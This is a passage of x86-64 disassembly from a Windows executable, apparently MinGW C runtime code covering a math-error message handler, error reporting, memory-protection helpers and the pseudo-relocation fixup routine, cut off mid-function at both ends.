   14000254f:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140002553:	83 7d 18 03          	cmpl   $0x3,0x18(%rbp)
   140002557:	74 0d                	je     0x140002566
   140002559:	83 7d 18 00          	cmpl   $0x0,0x18(%rbp)
   14000255d:	74 07                	je     0x140002566
   14000255f:	b8 01 00 00 00       	mov    $0x1,%eax
   140002564:	eb 1b                	jmp    0x140002581
   140002566:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   14000256a:	8b 55 18             	mov    0x18(%rbp),%edx
   14000256d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002571:	49 89 c8             	mov    %rcx,%r8
   140002574:	48 89 c1             	mov    %rax,%rcx
   140002577:	e8 15 0f 00 00       	call   0x140003491
   14000257c:	b8 01 00 00 00       	mov    $0x1,%eax
   140002581:	48 83 c4 20          	add    $0x20,%rsp
   140002585:	5d                   	pop    %rbp
   140002586:	c3                   	ret
   140002587:	90                   	nop
   140002588:	90                   	nop
   140002589:	90                   	nop
   14000258a:	90                   	nop
   14000258b:	90                   	nop
   14000258c:	90                   	nop
   14000258d:	90                   	nop
   14000258e:	90                   	nop
   14000258f:	90                   	nop
   140002590:	55                   	push   %rbp
   140002591:	53                   	push   %rbx
   140002592:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   140002599:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   14000259e:	0f 29 75 00          	movaps %xmm6,0x0(%rbp)
   1400025a2:	0f 29 7d 10          	movaps %xmm7,0x10(%rbp)
   1400025a6:	44 0f 29 45 20       	movaps %xmm8,0x20(%rbp)
   1400025ab:	48 89 4d 50          	mov    %rcx,0x50(%rbp)
   1400025af:	48 8b 45 50          	mov    0x50(%rbp),%rax
   1400025b3:	8b 00                	mov    (%rax),%eax
   1400025b5:	83 f8 06             	cmp    $0x6,%eax
   1400025b8:	74 56                	je     0x140002610
   1400025ba:	83 f8 06             	cmp    $0x6,%eax
   1400025bd:	7f 78                	jg     0x140002637
   1400025bf:	83 f8 05             	cmp    $0x5,%eax
   1400025c2:	74 59                	je     0x14000261d
   1400025c4:	83 f8 05             	cmp    $0x5,%eax
   1400025c7:	7f 6e                	jg     0x140002637
   1400025c9:	83 f8 04             	cmp    $0x4,%eax
   1400025cc:	74 5c                	je     0x14000262a
   1400025ce:	83 f8 04             	cmp    $0x4,%eax
   1400025d1:	7f 64                	jg     0x140002637
   1400025d3:	83 f8 03             	cmp    $0x3,%eax
   1400025d6:	74 2b                	je     0x140002603
   1400025d8:	83 f8 03             	cmp    $0x3,%eax
   1400025db:	7f 5a                	jg     0x140002637
   1400025dd:	83 f8 01             	cmp    $0x1,%eax
   1400025e0:	74 07                	je     0x1400025e9
   1400025e2:	83 f8 02             	cmp    $0x2,%eax
   1400025e5:	74 0f                	je     0x1400025f6
   1400025e7:	eb 4e                	jmp    0x140002637
   1400025e9:	48 8d 05 50 9c 00 00 	lea    0x9c50(%rip),%rax        # 0x14000c240
   1400025f0:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400025f4:	eb 4d                	jmp    0x140002643
   1400025f6:	48 8d 05 62 9c 00 00 	lea    0x9c62(%rip),%rax        # 0x14000c25f
   1400025fd:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002601:	eb 40                	jmp    0x140002643
   140002603:	48 8d 05 76 9c 00 00 	lea    0x9c76(%rip),%rax        # 0x14000c280
   14000260a:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000260e:	eb 33                	jmp    0x140002643
   140002610:	48 8d 05 89 9c 00 00 	lea    0x9c89(%rip),%rax        # 0x14000c2a0
   140002617:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000261b:	eb 26                	jmp    0x140002643
   14000261d:	48 8d 05 a4 9c 00 00 	lea    0x9ca4(%rip),%rax        # 0x14000c2c8
   140002624:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002628:	eb 19                	jmp    0x140002643
   14000262a:	48 8d 05 bf 9c 00 00 	lea    0x9cbf(%rip),%rax        # 0x14000c2f0
   140002631:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002635:	eb 0c                	jmp    0x140002643
   140002637:	48 8d 05 e8 9c 00 00 	lea    0x9ce8(%rip),%rax        # 0x14000c326
   14000263e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002642:	90                   	nop
   140002643:	48 8b 45 50          	mov    0x50(%rbp),%rax
   140002647:	f2 44 0f 10 40 20    	movsd  0x20(%rax),%xmm8
   14000264d:	48 8b 45 50          	mov    0x50(%rbp),%rax
   140002651:	f2 0f 10 78 18       	movsd  0x18(%rax),%xmm7
   140002656:	48 8b 45 50          	mov    0x50(%rbp),%rax
   14000265a:	f2 0f 10 70 10       	movsd  0x10(%rax),%xmm6
   14000265f:	48 8b 45 50          	mov    0x50(%rbp),%rax
   140002663:	48 8b 58 08          	mov    0x8(%rax),%rbx
   140002667:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000266c:	e8 cf 72 00 00       	call   0x140009940
   140002671:	48 89 c1             	mov    %rax,%rcx
   140002674:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140002678:	48 8d 05 b9 9c 00 00 	lea    0x9cb9(%rip),%rax        # 0x14000c338
   14000267f:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   140002686:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   14000268c:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   140002692:	49 89 d9             	mov    %rbx,%r9
   140002695:	49 89 d0             	mov    %rdx,%r8
   140002698:	48 89 c2             	mov    %rax,%rdx
   14000269b:	e8 20 7a 00 00       	call   0x14000a0c0
   1400026a0:	b8 00 00 00 00       	mov    $0x0,%eax
   1400026a5:	0f 28 75 00          	movaps 0x0(%rbp),%xmm6
   1400026a9:	0f 28 7d 10          	movaps 0x10(%rbp),%xmm7
   1400026ad:	44 0f 28 45 20       	movaps 0x20(%rbp),%xmm8
   1400026b2:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400026b9:	5b                   	pop    %rbx
   1400026ba:	5d                   	pop    %rbp
   1400026bb:	c3                   	ret
   1400026bc:	90                   	nop
   1400026bd:	90                   	nop
   1400026be:	90                   	nop
   1400026bf:	90                   	nop
   1400026c0:	55                   	push   %rbp
   1400026c1:	48 89 e5             	mov    %rsp,%rbp
   1400026c4:	db e3                	fninit
   1400026c6:	90                   	nop
   1400026c7:	5d                   	pop    %rbp
   1400026c8:	c3                   	ret
   1400026c9:	90                   	nop
   1400026ca:	90                   	nop
   1400026cb:	90                   	nop
   1400026cc:	90                   	nop
   1400026cd:	90                   	nop
   1400026ce:	90                   	nop
   1400026cf:	90                   	nop
   1400026d0:	55                   	push   %rbp
   1400026d1:	53                   	push   %rbx
   1400026d2:	48 83 ec 38          	sub    $0x38,%rsp
   1400026d6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400026db:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   1400026df:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   1400026e3:	4c 89 45 30          	mov    %r8,0x30(%rbp)
   1400026e7:	4c 89 4d 38          	mov    %r9,0x38(%rbp)
   1400026eb:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1400026ef:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   1400026f3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400026f8:	e8 43 72 00 00       	call   0x140009940
   1400026fd:	48 89 c2             	mov    %rax,%rdx
   140002700:	48 8d 05 69 9c 00 00 	lea    0x9c69(%rip),%rax        # 0x14000c370
   140002707:	49 89 d1             	mov    %rdx,%r9
   14000270a:	41 b8 1b 00 00 00    	mov    $0x1b,%r8d
   140002710:	ba 01 00 00 00       	mov    $0x1,%edx
   140002715:	48 89 c1             	mov    %rax,%rcx
   140002718:	e8 c3 79 00 00       	call   0x14000a0e0
   14000271d:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
   140002721:	b9 02 00 00 00       	mov    $0x2,%ecx
   140002726:	e8 15 72 00 00       	call   0x140009940
   14000272b:	48 89 c1             	mov    %rax,%rcx
   14000272e:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002732:	49 89 d8             	mov    %rbx,%r8
   140002735:	48 89 c2             	mov    %rax,%rdx
   140002738:	e8 fb 79 00 00       	call   0x14000a138
   14000273d:	e8 4e 79 00 00       	call   0x14000a090
   140002742:	90                   	nop
   140002743:	55                   	push   %rbp
   140002744:	48 89 e5             	mov    %rsp,%rbp
   140002747:	48 83 ec 60          	sub    $0x60,%rsp
   14000274b:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000274f:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140002756:	e9 82 00 00 00       	jmp    0x1400027dd
   14000275b:	48 8b 0d 9e e9 00 00 	mov    0xe99e(%rip),%rcx        # 0x140011100
   140002762:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002765:	48 63 d0             	movslq %eax,%rdx
   140002768:	48 89 d0             	mov    %rdx,%rax
   14000276b:	48 c1 e0 02          	shl    $0x2,%rax
   14000276f:	48 01 d0             	add    %rdx,%rax
   140002772:	48 c1 e0 03          	shl    $0x3,%rax
   140002776:	48 01 c8             	add    %rcx,%rax
   140002779:	48 8b 40 18          	mov    0x18(%rax),%rax
   14000277d:	48 39 45 10          	cmp    %rax,0x10(%rbp)
   140002781:	72 56                	jb     0x1400027d9
   140002783:	48 8b 0d 76 e9 00 00 	mov    0xe976(%rip),%rcx        # 0x140011100
   14000278a:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000278d:	48 63 d0             	movslq %eax,%rdx
   140002790:	48 89 d0             	mov    %rdx,%rax
   140002793:	48 c1 e0 02          	shl    $0x2,%rax
   140002797:	48 01 d0             	add    %rdx,%rax
   14000279a:	48 c1 e0 03          	shl    $0x3,%rax
   14000279e:	48 01 c8             	add    %rcx,%rax
   1400027a1:	48 8b 48 18          	mov    0x18(%rax),%rcx
   1400027a5:	4c 8b 05 54 e9 00 00 	mov    0xe954(%rip),%r8        # 0x140011100
   1400027ac:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400027af:	48 63 d0             	movslq %eax,%rdx
   1400027b2:	48 89 d0             	mov    %rdx,%rax
   1400027b5:	48 c1 e0 02          	shl    $0x2,%rax
   1400027b9:	48 01 d0             	add    %rdx,%rax
   1400027bc:	48 c1 e0 03          	shl    $0x3,%rax
   1400027c0:	4c 01 c0             	add    %r8,%rax
   1400027c3:	48 8b 40 20          	mov    0x20(%rax),%rax
   1400027c7:	8b 40 08             	mov    0x8(%rax),%eax
   1400027ca:	89 c0                	mov    %eax,%eax
   1400027cc:	48 01 c8             	add    %rcx,%rax
   1400027cf:	48 39 45 10          	cmp    %rax,0x10(%rbp)
   1400027d3:	0f 82 41 02 00 00    	jb     0x140002a1a
   1400027d9:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   1400027dd:	8b 05 25 e9 00 00    	mov    0xe925(%rip),%eax        # 0x140011108
   1400027e3:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   1400027e6:	0f 8c 6f ff ff ff    	jl     0x14000275b
   1400027ec:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400027f0:	48 89 c1             	mov    %rax,%rcx
   1400027f3:	e8 73 0f 00 00       	call   0x14000376b
   1400027f8:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400027fc:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
   140002801:	75 13                	jne    0x140002816
   140002803:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002807:	48 8d 0d 82 9b 00 00 	lea    0x9b82(%rip),%rcx        # 0x14000c390
   14000280e:	48 89 c2             	mov    %rax,%rdx
   140002811:	e8 ba fe ff ff       	call   0x1400026d0
   140002816:	48 8b 0d e3 e8 00 00 	mov    0xe8e3(%rip),%rcx        # 0x140011100
   14000281d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002820:	48 63 d0             	movslq %eax,%rdx
   140002823:	48 89 d0             	mov    %rdx,%rax
   140002826:	48 c1 e0 02          	shl    $0x2,%rax
   14000282a:	48 01 d0             	add    %rdx,%rax
   14000282d:	48 c1 e0 03          	shl    $0x3,%rax
   140002831:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   140002835:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140002839:	48 89 42 20          	mov    %rax,0x20(%rdx)
   14000283d:	48 8b 0d bc e8 00 00 	mov    0xe8bc(%rip),%rcx        # 0x140011100
   140002844:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002847:	48 63 d0             	movslq %eax,%rdx
   14000284a:	48 89 d0             	mov    %rdx,%rax
   14000284d:	48 c1 e0 02          	shl    $0x2,%rax
   140002851:	48 01 d0             	add    %rdx,%rax
   140002854:	48 c1 e0 03          	shl    $0x3,%rax
   140002858:	48 01 c8             	add    %rcx,%rax
   14000285b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140002861:	e8 51 10 00 00       	call   0x1400038b7
   140002866:	48 89 c1             	mov    %rax,%rcx
   140002869:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000286d:	8b 40 0c             	mov    0xc(%rax),%eax
   140002870:	41 89 c1             	mov    %eax,%r9d
   140002873:	4c 8b 05 86 e8 00 00 	mov    0xe886(%rip),%r8        # 0x140011100
   14000287a:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000287d:	48 63 d0             	movslq %eax,%rdx
   140002880:	48 89 d0             	mov    %rdx,%rax
   140002883:	48 c1 e0 02          	shl    $0x2,%rax
   140002887:	48 01 d0             	add    %rdx,%rax
   14000288a:	48 c1 e0 03          	shl    $0x3,%rax
   14000288e:	4c 01 c0             	add    %r8,%rax
   140002891:	4a 8d 14 09          	lea    (%rcx,%r9,1),%rdx
   140002895:	48 89 50 18          	mov    %rdx,0x18(%rax)
   140002899:	48 8b 0d 60 e8 00 00 	mov    0xe860(%rip),%rcx        # 0x140011100
   1400028a0:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400028a3:	48 63 d0             	movslq %eax,%rdx
   1400028a6:	48 89 d0             	mov    %rdx,%rax
   1400028a9:	48 c1 e0 02          	shl    $0x2,%rax
   1400028ad:	48 01 d0             	add    %rdx,%rax
   1400028b0:	48 c1 e0 03          	shl    $0x3,%rax
   1400028b4:	48 01 c8             	add    %rcx,%rax
   1400028b7:	48 8b 40 18          	mov    0x18(%rax),%rax
   1400028bb:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   1400028bf:	41 b8 30 00 00 00    	mov    $0x30,%r8d
   1400028c5:	48 89 c1             	mov    %rax,%rcx
   1400028c8:	48 8b 05 21 fa 00 00 	mov    0xfa21(%rip),%rax        # 0x1400122f0
   1400028cf:	ff d0                	call   *%rax
   1400028d1:	48 85 c0             	test   %rax,%rax
   1400028d4:	75 3f                	jne    0x140002915
   1400028d6:	48 8b 0d 23 e8 00 00 	mov    0xe823(%rip),%rcx        # 0x140011100
   1400028dd:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400028e0:	48 63 d0             	movslq %eax,%rdx
   1400028e3:	48 89 d0             	mov    %rdx,%rax
   1400028e6:	48 c1 e0 02          	shl    $0x2,%rax
   1400028ea:	48 01 d0             	add    %rdx,%rax
   1400028ed:	48 c1 e0 03          	shl    $0x3,%rax
   1400028f1:	48 01 c8             	add    %rcx,%rax
   1400028f4:	48 8b 50 18          	mov    0x18(%rax),%rdx
   1400028f8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400028fc:	8b 40 08             	mov    0x8(%rax),%eax
   1400028ff:	89 c1                	mov    %eax,%ecx
   140002901:	48 8d 05 a8 9a 00 00 	lea    0x9aa8(%rip),%rax        # 0x14000c3b0
   140002908:	49 89 d0             	mov    %rdx,%r8
   14000290b:	89 ca                	mov    %ecx,%edx
   14000290d:	48 89 c1             	mov    %rax,%rcx
   140002910:	e8 bb fd ff ff       	call   0x1400026d0
   140002915:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002918:	83 f8 40             	cmp    $0x40,%eax
   14000291b:	0f 84 e8 00 00 00    	je     0x140002a09
   140002921:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002924:	83 f8 04             	cmp    $0x4,%eax
   140002927:	0f 84 dc 00 00 00    	je     0x140002a09
   14000292d:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140002930:	3d 80 00 00 00       	cmp    $0x80,%eax
   140002935:	0f 84 ce 00 00 00    	je     0x140002a09
   14000293b:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000293e:	83 f8 08             	cmp    $0x8,%eax
   140002941:	0f 84 c2 00 00 00    	je     0x140002a09
   140002947:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   14000294a:	83 f8 02             	cmp    $0x2,%eax
   14000294d:	75 09                	jne    0x140002958
   14000294f:	c7 45 f8 04 00 00 00 	movl   $0x4,-0x8(%rbp)
   140002956:	eb 07                	jmp    0x14000295f
   140002958:	c7 45 f8 40 00 00 00 	movl   $0x40,-0x8(%rbp)
   14000295f:	48 8b 0d 9a e7 00 00 	mov    0xe79a(%rip),%rcx        # 0x140011100
   140002966:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002969:	48 63 d0             	movslq %eax,%rdx
   14000296c:	48 89 d0             	mov    %rdx,%rax
   14000296f:	48 c1 e0 02          	shl    $0x2,%rax
   140002973:	48 01 d0             	add    %rdx,%rax
   140002976:	48 c1 e0 03          	shl    $0x3,%rax
   14000297a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   14000297e:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   140002982:	48 89 42 08          	mov    %rax,0x8(%rdx)
   140002986:	48 8b 0d 73 e7 00 00 	mov    0xe773(%rip),%rcx        # 0x140011100
   14000298d:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002990:	48 63 d0             	movslq %eax,%rdx
   140002993:	48 89 d0             	mov    %rdx,%rax
   140002996:	48 c1 e0 02          	shl    $0x2,%rax
   14000299a:	48 01 d0             	add    %rdx,%rax
   14000299d:	48 c1 e0 03          	shl    $0x3,%rax
   1400029a1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
   1400029a5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   1400029a9:	48 89 42 10          	mov    %rax,0x10(%rdx)
   1400029ad:	48 8b 0d 4c e7 00 00 	mov    0xe74c(%rip),%rcx        # 0x140011100
   1400029b4:	8b 45 fc             	mov    -0x4(%rbp),%eax
   1400029b7:	48 63 d0             	movslq %eax,%rdx
   1400029ba:	48 89 d0             	mov    %rdx,%rax
   1400029bd:	48 c1 e0 02          	shl    $0x2,%rax
   1400029c1:	48 01 d0             	add    %rdx,%rax
   1400029c4:	48 c1 e0 03          	shl    $0x3,%rax
   1400029c8:	48 01 c8             	add    %rcx,%rax
   1400029cb:	49 89 c0             	mov    %rax,%r8
   1400029ce:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   1400029d2:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400029d6:	8b 4d f8             	mov    -0x8(%rbp),%ecx
   1400029d9:	4d 89 c1             	mov    %r8,%r9
   1400029dc:	41 89 c8             	mov    %ecx,%r8d
   1400029df:	48 89 c1             	mov    %rax,%rcx
   1400029e2:	48 8b 05 ff f8 00 00 	mov    0xf8ff(%rip),%rax        # 0x1400122e8
   1400029e9:	ff d0                	call   *%rax
   1400029eb:	85 c0                	test   %eax,%eax
   1400029ed:	75 1a                	jne    0x140002a09
   1400029ef:	48 8b 05 92 f8 00 00 	mov    0xf892(%rip),%rax        # 0x140012288
   1400029f6:	ff d0                	call   *%rax
   1400029f8:	89 c2                	mov    %eax,%edx
   1400029fa:	48 8d 05 e7 99 00 00 	lea    0x99e7(%rip),%rax        # 0x14000c3e8
   140002a01:	48 89 c1             	mov    %rax,%rcx
   140002a04:	e8 c7 fc ff ff       	call   0x1400026d0
   140002a09:	8b 05 f9 e6 00 00    	mov    0xe6f9(%rip),%eax        # 0x140011108
   140002a0f:	83 c0 01             	add    $0x1,%eax
   140002a12:	89 05 f0 e6 00 00    	mov    %eax,0xe6f0(%rip)        # 0x140011108
   140002a18:	eb 01                	jmp    0x140002a1b
   140002a1a:	90                   	nop
   140002a1b:	48 83 c4 60          	add    $0x60,%rsp
   140002a1f:	5d                   	pop    %rbp
   140002a20:	c3                   	ret
   140002a21:	55                   	push   %rbp
   140002a22:	48 89 e5             	mov    %rsp,%rbp
   140002a25:	48 83 ec 30          	sub    $0x30,%rsp
   140002a29:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140002a30:	e9 ad 00 00 00       	jmp    0x140002ae2
   140002a35:	48 8b 0d c4 e6 00 00 	mov    0xe6c4(%rip),%rcx        # 0x140011100
   140002a3c:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002a3f:	48 63 d0             	movslq %eax,%rdx
   140002a42:	48 89 d0             	mov    %rdx,%rax
   140002a45:	48 c1 e0 02          	shl    $0x2,%rax
   140002a49:	48 01 d0             	add    %rdx,%rax
   140002a4c:	48 c1 e0 03          	shl    $0x3,%rax
   140002a50:	48 01 c8             	add    %rcx,%rax
   140002a53:	8b 00                	mov    (%rax),%eax
   140002a55:	85 c0                	test   %eax,%eax
   140002a57:	0f 84 80 00 00 00    	je     0x140002add
   140002a5d:	48 8b 0d 9c e6 00 00 	mov    0xe69c(%rip),%rcx        # 0x140011100
   140002a64:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002a67:	48 63 d0             	movslq %eax,%rdx
   140002a6a:	48 89 d0             	mov    %rdx,%rax
   140002a6d:	48 c1 e0 02          	shl    $0x2,%rax
   140002a71:	48 01 d0             	add    %rdx,%rax
   140002a74:	48 c1 e0 03          	shl    $0x3,%rax
   140002a78:	48 01 c8             	add    %rcx,%rax
   140002a7b:	44 8b 10             	mov    (%rax),%r10d
   140002a7e:	48 8b 0d 7b e6 00 00 	mov    0xe67b(%rip),%rcx        # 0x140011100
   140002a85:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002a88:	48 63 d0             	movslq %eax,%rdx
   140002a8b:	48 89 d0             	mov    %rdx,%rax
   140002a8e:	48 c1 e0 02          	shl    $0x2,%rax
   140002a92:	48 01 d0             	add    %rdx,%rax
   140002a95:	48 c1 e0 03          	shl    $0x3,%rax
   140002a99:	48 01 c8             	add    %rcx,%rax
   140002a9c:	48 8b 48 10          	mov    0x10(%rax),%rcx
   140002aa0:	4c 8b 05 59 e6 00 00 	mov    0xe659(%rip),%r8        # 0x140011100
   140002aa7:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140002aaa:	48 63 d0             	movslq %eax,%rdx
   140002aad:	48 89 d0             	mov    %rdx,%rax
   140002ab0:	48 c1 e0 02          	shl    $0x2,%rax
   140002ab4:	48 01 d0             	add    %rdx,%rax
   140002ab7:	48 c1 e0 03          	shl    $0x3,%rax
   140002abb:	4c 01 c0             	add    %r8,%rax
   140002abe:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002ac2:	48 8d 55 f8          	lea    -0x8(%rbp),%rdx
   140002ac6:	49 89 d1             	mov    %rdx,%r9
   140002ac9:	45 89 d0             	mov    %r10d,%r8d
   140002acc:	48 89 ca             	mov    %rcx,%rdx
   140002acf:	48 89 c1             	mov    %rax,%rcx
   140002ad2:	48 8b 05 0f f8 00 00 	mov    0xf80f(%rip),%rax        # 0x1400122e8
   140002ad9:	ff d0                	call   *%rax
   140002adb:	eb 01                	jmp    0x140002ade
   140002add:	90                   	nop
   140002ade:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140002ae2:	8b 05 20 e6 00 00    	mov    0xe620(%rip),%eax        # 0x140011108
   140002ae8:	39 45 fc             	cmp    %eax,-0x4(%rbp)
   140002aeb:	0f 8c 44 ff ff ff    	jl     0x140002a35
   140002af1:	90                   	nop
   140002af2:	90                   	nop
   140002af3:	48 83 c4 30          	add    $0x30,%rsp
   140002af7:	5d                   	pop    %rbp
   140002af8:	c3                   	ret
   140002af9:	55                   	push   %rbp
   140002afa:	48 89 e5             	mov    %rsp,%rbp
   140002afd:	48 83 ec 20          	sub    $0x20,%rsp
   140002b01:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140002b05:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140002b09:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140002b0d:	48 83 7d 20 00       	cmpq   $0x0,0x20(%rbp)
   140002b12:	74 25                	je     0x140002b39
   140002b14:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002b18:	48 89 c1             	mov    %rax,%rcx
   140002b1b:	e8 23 fc ff ff       	call   0x140002743
   140002b20:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140002b24:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140002b28:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002b2c:	49 89 c8             	mov    %rcx,%r8
   140002b2f:	48 89 c1             	mov    %rax,%rcx
   140002b32:	e8 c1 75 00 00       	call   0x14000a0f8
   140002b37:	eb 01                	jmp    0x140002b3a
   140002b39:	90                   	nop
   140002b3a:	48 83 c4 20          	add    $0x20,%rsp
   140002b3e:	5d                   	pop    %rbp
   140002b3f:	c3                   	ret
   140002b40:	55                   	push   %rbp
   140002b41:	48 89 e5             	mov    %rsp,%rbp
   140002b44:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
   140002b48:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140002b4c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140002b50:	4c 89 45 20          	mov    %r8,0x20(%rbp)
   140002b54:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140002b58:	48 2b 45 10          	sub    0x10(%rbp),%rax
   140002b5c:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140002b60:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140002b64:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002b68:	48 83 7d e0 07       	cmpq   $0x7,-0x20(%rbp)
   140002b6d:	0f 8e 44 03 00 00    	jle    0x140002eb7
   140002b73:	48 83 7d e0 0b       	cmpq   $0xb,-0x20(%rbp)
   140002b78:	7e 25                	jle    0x140002b9f
   140002b7a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002b7e:	8b 00                	mov    (%rax),%eax
   140002b80:	85 c0                	test   %eax,%eax
   140002b82:	75 1b                	jne    0x140002b9f
   140002b84:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002b88:	8b 40 04             	mov    0x4(%rax),%eax
   140002b8b:	85 c0                	test   %eax,%eax
   140002b8d:	75 10                	jne    0x140002b9f
   140002b8f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002b93:	8b 40 08             	mov    0x8(%rax),%eax
   140002b96:	85 c0                	test   %eax,%eax
   140002b98:	75 05                	jne    0x140002b9f
   140002b9a:	48 83 45 f8 0c       	addq   $0xc,-0x8(%rbp)
   140002b9f:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002ba3:	8b 00                	mov    (%rax),%eax
   140002ba5:	85 c0                	test   %eax,%eax
   140002ba7:	75 0b                	jne    0x140002bb4
   140002ba9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002bad:	8b 40 04             	mov    0x4(%rax),%eax
   140002bb0:	85 c0                	test   %eax,%eax
   140002bb2:	74 59                	je     0x140002c0d
   140002bb4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002bb8:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140002bbc:	eb 40                	jmp    0x140002bfe
   140002bbe:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002bc2:	8b 40 04             	mov    0x4(%rax),%eax
   140002bc5:	89 c2                	mov    %eax,%edx
   140002bc7:	48 8b 45 20          	mov    0x20(%rbp),%rax
   140002bcb:	48 01 d0             	add    %rdx,%rax
   140002bce:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140002bd2:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002bd6:	8b 10                	mov    (%rax),%edx
   140002bd8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002bdc:	8b 00                	mov    (%rax),%eax
   140002bde:	01 d0                	add    %edx,%eax
   140002be0:	89 45 b4             	mov    %eax,-0x4c(%rbp)
   140002be3:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140002be7:	48 8d 55 b4          	lea    -0x4c(%rbp),%rdx
   140002beb:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140002bf1:	48 89 c1             	mov    %rax,%rcx
   140002bf4:	e8 00 ff ff ff       	call   0x140002af9
   140002bf9:	48 83 45 e8 08       	addq   $0x8,-0x18(%rbp)
   140002bfe:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140002c02:	48 3b 45 18          	cmp    0x18(%rbp),%rax
   140002c06:	72 b6                	jb     0x140002bbe
   140002c08:	e9 ab 02 00 00       	jmp    0x140002eb8
   140002c0d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002c11:	8b 40 08             	mov    0x8(%rax),%eax
   140002c14:	83 f8 01             	cmp    $0x1,%eax
   140002c17:	74 18                	je     0x140002c31
   140002c19:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140002c1d:	8b 40 08             	mov    0x8(%rax),%eax
   140002c20:	89 c2                	mov    %eax,%edx
   140002c22:	48 8d 05 e7 97 00 00 	lea    0x97e7(%rip),%rax        # 0x14000c410
   140002c29:	48 89 c1             	mov    %rax,%rcx
